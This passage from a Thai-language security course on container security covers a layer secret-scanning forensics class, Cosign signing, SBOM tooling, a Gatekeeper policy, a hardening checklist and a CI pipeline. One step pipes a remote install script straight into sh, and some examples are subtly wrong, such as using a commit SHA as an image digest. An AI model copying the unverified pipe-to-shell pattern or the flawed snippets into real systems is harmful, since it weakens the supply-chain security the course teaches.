                    if len(match) > 5:  # ไม่นับ short strings
                        secrets_found.append({
                            "layer": i,
                            "type": label,
                            "match": match[:50]
                        })
        
        if secrets_found:
            print(f"[!!!] Found {len(secrets_found)} potential secrets in layers!")
            for s in secrets_found:
                print(f"  Layer {s['layer']}: [{s['type']}] {s['match']}")
        else:
            print("[+] No secrets found in image layers")
        
        return secrets_found
    
    def _sha256(self, filepath) -> str:
        """คำนวณ SHA256 hash ของไฟล์"""
        h = hashlib.sha256()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    
    def generate_chain_of_custody(self):
        """สร้าง chain of custody document"""
        coc = {
            "incident_id": f"INC-{datetime.now().strftime('%Y%m%d%H%M%S')}",
            "container_id": self.container_id,
            "collection_time": datetime.now().isoformat(),
            "collector": os.environ.get("USER", "unknown"),
            "evidence_items": self.evidence,
            "integrity_verified": True
        }
        
        coc_path = self.output_dir / "chain_of_custody.json"
        with open(coc_path, "w") as f:
            json.dump(coc, f, indent=2)
        
        print(f"[+] Chain of Custody saved to {coc_path}")
        return coc

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    forensics = ContainerForensics(
        container_id="abc123def456",
        output_dir="/tmp/forensics/container_abc123"
    )
    
    # เก็บ evidence
    evidence = forensics.preserve_container_state()
    
    # วิเคราะห์
    forensics.check_image_layers()
    
    # สร้าง chain of custody
    forensics.generate_chain_of_custody()
```

---

## 14. Supply Chain Security

### Image Signing with Cosign

```bash
# ติดตั้ง cosign
wget https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
chmod +x cosign-linux-amd64
mv cosign-linux-amd64 /usr/local/bin/cosign

# สร้าง key pair
cosign generate-key-pair
# สร้างไฟล์: cosign.key (private) และ cosign.pub (public)

# Sign image หลัง push
cosign sign --key cosign.key myregistry.com/myapp:v1.0.0

# Verify image signature
cosign verify --key cosign.pub myregistry.com/myapp:v1.0.0

# Verify ด้วย Keyless signing (ใช้ OIDC)
cosign sign myregistry.com/myapp:v1.0.0  # ใช้ GitHub Actions OIDC

# ตรวจสอบ SBOM (Software Bill of Materials)
cosign attach sbom --sbom app.spdx myregistry.com/myapp:v1.0.0
cosign verify-attestation --key cosign.pub \
  --type spdxjson \
  myregistry.com/myapp:v1.0.0
```

### SBOM Generation

```bash
# สร้าง SBOM ด้วย Syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# สร้าง SBOM ในรูปแบบต่างๆ
syft myregistry.com/myapp:v1.0.0 -o spdx-json > app.spdx.json
syft myregistry.com/myapp:v1.0.0 -o cyclonedx-json > app.cyclonedx.json

# ตรวจสอบ SBOM กับ known vulnerabilities ด้วย Grype
grype sbom:./app.spdx.json

# Scan ด้วย Grype โดยตรง
grype myregistry.com/myapp:v1.0.0 \
  --fail-on critical \
  -o json > grype-results.json
```

### Admission Controller Policy (OPA/Gatekeeper)

```yaml
# gatekeeper-require-signed-images.yaml
# บังคับใช้ signed images เท่านั้น

apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiresignedimages
spec:
  crd:
    spec:
      names:
        kind: K8sRequireSignedImages
      validation:
        openAPIV3Schema:
          type: object
          properties:
            trustedRepositories:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiresignedimages
        
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          image := container.image
          not is_trusted_image(image)
          msg := sprintf("Container image '%v' is not from a trusted repository", [image])
        }
        
        is_trusted_image(image) {
          trusted_repo := input.parameters.trustedRepositories[_]
          startswith(image, trusted_repo)
        }
        
        # ต้องใช้ digest แทน tag
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          image := container.image
          not contains(image, "@sha256:")
          msg := sprintf("Container image '%v' must use digest (@sha256:...) not a tag", [image])
        }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireSignedImages
metadata:
  name: require-signed-images
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces: ["production", "staging"]
  parameters:
    trustedRepositories:
      - "myregistry.company.com/"
      - "registry.k8s.io/"
```

---

## 15. สรุป Container Security

### Container Security Maturity Model

| ระดับ | ขีดความสามารถ | เครื่องมือ |
|-------|---------------|------------|
| **Level 1: Basic** | Image scanning, non-root user | Trivy, Dockerfile lint |
| **Level 2: Standard** | RBAC, Network Policies, PSS | kubectl, OPA |
| **Level 3: Advanced** | Runtime security, Secret mgmt | Falco, Vault, Cosign |
| **Level 4: Expert** | SBOM, Supply chain, Zero-trust | Syft, Sigstore, mTLS |
| **Level 5: World-class** | Automated policy, AI detection | Kyverno, eBPF, ML |

### Security Checklist

```bash
#!/bin/bash
# container_security_checklist.sh
# Checklist ตรวจสอบความปลอดภัย Container

PASS=0; FAIL=0; WARN=0

check() {
    local name="$1"; local cmd="$2"; local expected="$3"
    result=$(eval "$cmd" 2>/dev/null)
    if [[ "$result" == *"$expected"* ]]; then
        echo "[ OK ] $name"; ((PASS++))
    else
        echo "[FAIL] $name: $result"; ((FAIL++))
    fi
}

warn() {
    local name="$1"; local cmd="$2"; local bad="$3"
    result=$(eval "$cmd" 2>/dev/null)
    if [[ "$result" == *"$bad"* ]]; then
        echo "[WARN] $name"; ((WARN++))
    else
        echo "[ OK ] $name"; ((PASS++))
    fi
}

echo "======================================"
echo "Container Security Checklist"
echo "======================================"

echo "\n--- Docker Daemon ---"
check "Docker uses content trust" \
    "cat /etc/docker/daemon.json" '"content-trust"'
check "Docker userns-remap enabled" \
    "docker info" 'userns'
warn "Docker socket not world-writable" \
    "stat -c '%a' /var/run/docker.sock" '777'

echo "\n--- Running Containers ---"
warn "No privileged containers" \
    "docker ps -q | xargs docker inspect --format '{{.Name}} {{.HostConfig.Privileged}}' 2>/dev/null" 'true'
warn "No containers with host network" \
    "docker ps -q | xargs docker inspect --format '{{.Name}} {{.HostConfig.NetworkMode}}' 2>/dev/null" 'host'
warn "No containers mounting docker.sock" \
    "docker ps -q | xargs docker inspect --format '{{.Name}} {{.HostConfig.Binds}}' 2>/dev/null" 'docker.sock'

echo "\n--- Kubernetes ---"
check "No anonymous auth on API" \
    "kubectl get --insecure-skip-tls-verify nodes 2>&1" 'Error'
check "Network policies exist" \
    "kubectl get networkpolicies --all-namespaces 2>/dev/null | wc -l" '[^0]'
check "Pod Security Admission enabled" \
    "kubectl get namespace production -o yaml 2>/dev/null" 'pod-security.kubernetes.io'

echo "\n======================================"
echo "Results: PASS=$PASS FAIL=$FAIL WARN=$WARN"
echo "======================================"

[[ $FAIL -eq 0 ]] && exit 0 || exit 1
```

### การ Integrate กับ CI/CD

```yaml
# .github/workflows/container-security.yml
name: Container Security Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:

jobs:
  dockerfile-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Lint Dockerfile with hadolint
        uses: hadolint/hadolint-action@v3.1.0
        with:
          dockerfile: Dockerfile
          failure-threshold: warning

  image-scan:
    runs-on: ubuntu-latest
    needs: dockerfile-lint
    steps:
      - uses: actions/checkout@v4
      
      - name: Build image
        run: docker build -t test-image:${{ github.sha }} .
      
      - name: Scan with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: test-image:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          exit-code: '1'  # ล้มเหลวถ้าพบ CRITICAL/HIGH
      
      - name: Upload scan results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-results.sarif

  sbom-generation:
    runs-on: ubuntu-latest
    needs: image-scan
    steps:
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: test-image:${{ github.sha }}
          artifact-name: sbom.spdx.json
          output-file: sbom.spdx.json
      
      - name: Attest SBOM
        uses: actions/attest-sbom@v1
        with:
          subject-name: test-image
          subject-digest: sha256:${{ github.sha }}
          sbom-path: sbom.spdx.json
          push-to-registry: true

  sign-image:
    runs-on: ubuntu-latest
    needs: sbom-generation
    if: github.ref == 'refs/heads/main'
    permissions:
      id-token: write  # สำหรับ OIDC
      packages: write
    steps:
      - name: Sign image with Cosign
        uses: sigstore/cosign-installer@v3
      
      - name: Sign container image
        run: |
          cosign sign --yes \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
```

---

> **Navigation:** ← [Part 89: Cloud Security](Part-89-Cloud-Security.md) | [Part 91: Advanced Exploit Development](Part-91-Advanced-Exploit-Development.md) →

---
*Part 90 of the Kali Linux Professional Course | Container Security: Docker + Kubernetes*
